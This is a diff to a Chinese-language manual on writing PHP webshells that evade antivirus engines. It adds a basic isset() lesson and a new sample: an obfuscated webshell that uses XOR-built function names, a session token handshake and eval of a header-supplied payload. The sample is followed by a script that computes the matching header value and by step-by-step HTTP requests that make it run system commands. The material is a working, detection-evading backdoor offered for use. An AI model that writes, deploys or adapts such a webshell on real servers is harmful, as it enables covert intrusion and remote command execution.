@@ -2,7 +2,7 @@
 
 ![WebShell-Bypass-Guide](https://socialify.git.ci/AabyssZG/WebShell-Bypass-Guide/image?description=1&font=Jost&forks=1&issues=1&language=1&logo=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F54609266%3Fv%3D4&name=1&owner=1&pattern=Floating%20Cogs&stargazers=1&theme=Dark)
 
-**手册版本号：V1.3-20230807**
+**手册版本号：V1.4-20230924**
 
 这是一本能让你从零开始学习PHP的WebShell免杀的手册，同时我会在内部群迭代更新
 
@@ -386,6 +386,51 @@ Array
     [2] => 6
     [3] => 8
 )
+```
+
+### 1.6 isset()
+
+**`isset()` 函数用于检测变量是否已设置并且非 NULL**
+
+isset 在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false
+isset 只能用于变量，因为传递任何其它参数都将造成解析错误
+
+Demo:
+
+```php
+$var = '';
+ 
+// 结果为 TRUE，所以后边的文本将被打印出来。
+if (isset($var)) {
+    echo "变量已设置。" . PHP_EOL;
+}
+ 
+// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。
+// the return value of isset().
+ 
+$a = "test";
+$b = "anothertest";
+ 
+var_dump(isset($a));      // TRUE
+var_dump(isset($a, $b)); // TRUE
+ 
+unset ($a);
+ 
+var_dump(isset($a));     // FALSE
+var_dump(isset($a, $b)); // FALSE
+ 
+$foo = NULL;
+var_dump(isset($foo));   // FALSE
+```
+
+输出：
+
+```php
+bool(true)
+bool(true)
+bool(false)
+bool(false)
+bool(false)
 ```
 
 
@@ -1487,6 +1532,247 @@ print(response.text)
 ```
 
 ![样例二成功执行命令.png](https://blog.zgsec.cn/usr/uploads/2023/08/2146327561.png)
+
+### 12.3 样例三
+
+这个免杀马是在近期某大型攻防演练中捕获到的，也是能过一众查杀引擎~
+这个样例使用了异或+编解码转换+参数加解密回调+密钥协商的手法，成功规避了语义分析和正则匹配式，具有实战意义
+
+这个WebShell和冰蝎马等具有相似性，各位师傅不妨可以看看原理：
+
+```php
+<?php
+session_start();
+
+function set_token($v,$t) {
+	$r="";
+	for ($x=0; $x<strlen($v);$x++) {
+		if(($x+1)%strlen($t)!=0) {
+			$r.=chr(ord(substr($v,$x,$x+1))^ord(substr($t,$x%strlen($t),($x+1) % strlen($t))));
+		} else {
+			$r.=chr(ord(substr($v,$x,$x+1))^ord(substr($t,$x%strlen($t),16)));
+		}
+	}
+	return $r;
+}
+
+if (isset($_SERVER["HTTP_TOKEN"])) {
+	$t=substr(md5(rand()),16);
+	$_SESSION['token']=$t;
+	header('Token:'.$_SESSION['token']);
+} else {
+	if(!isset($_SESSION['token'])) {
+		return;
+	}
+	$v=$_SERVER['HTTP_X_CSRF_TOKEN'];
+	$b='DQHNGW'^'&0;+qc';
+	$b.= '_dec'.chr(111).'de';
+	$v=$b($v."");
+	
+	class E {
+		public function __construct($p) {
+			$c=('ZSLQWR'^'82?4af')."_d"."eco".chr(108-8)."e";
+			$e = $c($p);
+			eval(null.$e."");
+		}
+	}
+	@new E(set_token($v, $_SESSION['token']));
+}
+```
+
+这个WebShell要如何执行命令呢？共需要三步，请看我细细分析~
+
+首先，这个函数定义了一个函数 `set_token()` 和一个类 `class E`，但我们不着急看，我们先看PHP先执行的部分：
+
+```php
+if (isset($_SERVER["HTTP_TOKEN"])) {
+	$t=substr(md5(rand()),16);
+	$_SESSION['token']=$t;
+	header('Token:'.$_SESSION['token']);
+} else {
+	if(!isset($_SESSION['token'])) {
+		return;
+	}
+	$v=$_SERVER['HTTP_X_CSRF_TOKEN'];
+	$b='DQHNGW'^'&0;+qc';
+	$b.= '_dec'.chr(111).'de';
+	$v=$b($v."");
+}
+```
+
+由1.6讲到的知识点，结合PHP代码可得：
+
+>if (!isset($_SESSION['token'])) 这行代码首先检查当前会话（session）中是否存在名为 "token" 的变量。
+>$_SESSION 是用于在PHP中存储会话数据的关联数组，通常用于在不同页面之间共享数据。isset函数用于检查变量是否已经被设置，如果变量存在并且有值，返回 true，否则返回 false。
+
+所以根据知识点，我们要先给服务器发一个 `Token` 值，这样就可以进入IF，服务器就会生成一个随机的令牌（token）并将其存储在会话（session）中，并通过HTTP头部返回给客户端
+
+但 `Token` 只需要获取一次就行了，因为服务器生成并返还令牌（token）后，会存在会话（session）中，简单理解就是服务器的内存当中，后续的使用就不要添加`Token` 值了
+ **【因为如果再获取，令牌（token）又会重新生成，就无法进入else的后续步骤，这一步可能有点绕，不明白的师傅不妨上手实践一下哈哈】** 
+
+```php
+$v=$_SERVER['HTTP_X_CSRF_TOKEN'];
+$b='DQHNGW'^'&0;+qc';
+$b.= '_dec'.chr(111).'de';
+$v=$b($v."");
+```
+
+由8.1讲到的异或和0.1讲到的拼接赋值，以上代码可转化为：
+
+```php
+$v = $_SERVER['HTTP_X_CSRF_TOKEN'];
+$b = "base64_decode";
+$v = $b($v."");
+```
+
+意思就是，从HTTP请求头获取名为 "HTTP_X_CSRF_TOKEN" 的值，并进行Base64解密再讲值重新赋给 `$v`
+
+接下来我们再来看类 `class E` :
+
+```php
+class E {
+		public function __construct($p) {
+			$c=('ZSLQWR'^'82?4af')."_d"."eco".chr(108-8)."e";
+			$e = $c($p);
+			eval(null.$e."");
+		}
+	}
+```
+
+同样根据相关知识点，我们可以将以上代码转化为以下：
+
+```php
+class E {
+		public function __construct($p) {
+			$c = "base64_decode";
+			$e = $c($p);
+			eval(null.$e."");
+		}
+	}
+```
+
+意思就是类 `class E` 接受一个参数 `$p`，将其通过Base64解密后，放入高危函数 `eval` 内执行
+ **那我们想要成功执行命令，就必须控制 `$p` 的传入值** 
+
+那我们看看所谓的 `$p` 是从哪里传入的吧：
+
+```php
+@new E(set_token($v, $_SESSION['token']));
+```
+
+由此可知，`$p` 为 `set_token($v, $_SESSION['token'])` 的执行结果，所以我们要控制 `set_token($v, $_SESSION['token'])` 的内容才能成功执行命令
+
+- `$v` 参数：从HTTP请求头获取名为 "HTTP_X_CSRF_TOKEN" 的值，并进行Base64解密再讲值重新赋给 `$v`
+- `$_SESSION['token']` 参数：给服务器发一个 `TOKEN` 值，会生成一个随机的令牌（token）并将其存储在会话（session）中，并通过HTTP头部返回给客户端
+
+明白了两个参数都是从哪来的之后，我们再来看函数 `set_token()`：
+
+```php
+function set_token($v,$t) {
+	$r="";
+	for ($x=0; $x<strlen($v);$x++) {
+		if(($x+1)%strlen($t)!=0) {
+			$r.=chr(ord(substr($v,$x,$x+1))^ord(substr($t,$x%strlen($t),($x+1) % strlen($t))));
+		} else {
+			$r.=chr(ord(substr($v,$x,$x+1))^ord(substr($t,$x%strlen($t),16)));
+		}
+	}
+	return $r;
+}
+```
+
+简单来说，函数 `set_token($v, $t)` 就是一个加密算法，作用是根据输入的两个字符串 `$v` 和 `$t`，返回一个新的字符串 `$r`
+该函数采用异或（XOR）操作对两个字符串的每个字符进行逐一处理，并将结果拼接成新的字符串返回
+
+而返回的 `$r` 变量，最终会传入 `@new E($r)`，进行Base64解密并放入高危函数 `eval` 内执行
+
+打个比方，假设我们想执行系统命令 `whoami`，那 `$r` 变量就应该是 `system('whoami'); ` Base64加密后的字符串 `c3lzdGVtKCd3aG9hbWknKTsg`
+而 `$r` 变量又是 `set_token($v, $_SESSION['token'])` 的加密结果，看上去很清晰，那目前我们的困境是什么？
+
+那就是我们不知道 `$v` 应该传什么值！！！我们目前只知道 `$t=>$_SESSION['token']` 和执行的最终结果 `$r=>c3lzdGVtKCd3aG9hbWknKTsg`，那我们能不能通过这两个变量获得 `$v`呢，当然可以！！！
+
+```php
+<?php
+function decrypt_token($r, $t) {
+    $v = "";
+    for ($x = 0; $x < strlen($r); $x++) {
+        if (($x + 1) % strlen($t) != 0) {
+            $v .= chr(ord(substr($r, $x, $x + 1)) ^ ord(substr($t, $x % strlen($t), ($x + 1) % strlen($t))));
+        } else {
+            $v .= chr(ord(substr($r, $x, $x + 1)) ^ ord(substr($t, $x % strlen($t), 16)));
+        }
+    }
+    return $v;
+}
+
+// 已知的 $t 和 $r 的值
+$t = $_POST['token'];  //已知的 $t 的值
+$r = $_POST['out'];  //"c3lzdGVtKCd3aG9hbWknKTsg" 已知的 $r 的值
+
+// 解密已知的 $r 值得到 $v
+$v = decrypt_token($r, $t);
+echo base64_encode($v);
+```
+
+通过编写这么一段代码，调换了一下顺序，就可以通过 `$t=>$_SESSION['token']` 和 `$r=>c3lzdGVtKCd3aG9hbWknKTsg`，拿到参数 `$v`
+
+至此，整条利用链已经清晰，我们来复现一下吧：
+
+#### 12.3.1 第一步、密钥协商得到Token
+
+对WebShell进行发包，`Token` 随便填啥都行
+
+```http
+GET /muma.php HTTP/1.1
+Host: test.ctf.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Token: 1
+Content-Length: 0
+
+```
+
+在返回包中可以看到服务器生成的 `Token` 值和 `Cookie` 值
+
+![样例三-1.png](https://blog.zgsec.cn/usr/uploads/2023/09/3979805148.png)
+
+#### 12.3.2 第二步，得到X-CSRF-TOKEN
+
+假设我们想执行系统命令 `whoami`，PHP代码就是 `system('whoami'); `，对其进行Base64加密后的字符串 `c3lzdGVtKCd3aG9hbWknKTsg`，当然你想执行其他的命令也行哈哈
+
+```http
+POST /decode.php HTTP/1.1
+Host: test.ctf.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Content-Length: 0
+
+token=a2b3fca92539495e&out=c3lzdGVtKCd3aG9hbWknKTsg
+```
+
+然后通过上文写的解密PHP，通过第一步获得的 `Token` 值和最终Base64加密后的字符串 `c3lzdGVtKCd3aG9hbWknKTsg`，拿到得到 `X-CSRF-TOKEN`
+
+![样例三-2.png](https://blog.zgsec.cn/usr/uploads/2023/09/1178498786.png)
+
+ **注：这不是对WebShell发包，而是我上面写的解密PHP `decode.php` 来进行解密** 
+
+#### 12.3.3 第三步，利用木马成功执行命令
+
+现在已经拿到 `X-CSRF-TOKEN` 和 `Cookie` 了，那就直接发包即可
+
+```http
+POST /muma.php HTTP/1.1
+Host: test.ctf.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=6g4sgte2t8nnv65u8er5cfdtnq;
+X-CSRF-TOKEN: AgEOSQIkN015dlcKVX4MDQNlCV0tNxJe
+Content-Length: 0
+
+```
+
+可以看到，成功执行系统命令 `whoami` 了
+
+![样例三-3.png](https://blog.zgsec.cn/usr/uploads/2023/09/3688888416.png)
 
 所以你学废了吗？更多有趣的WebShell免杀案例等我后续更新~
 
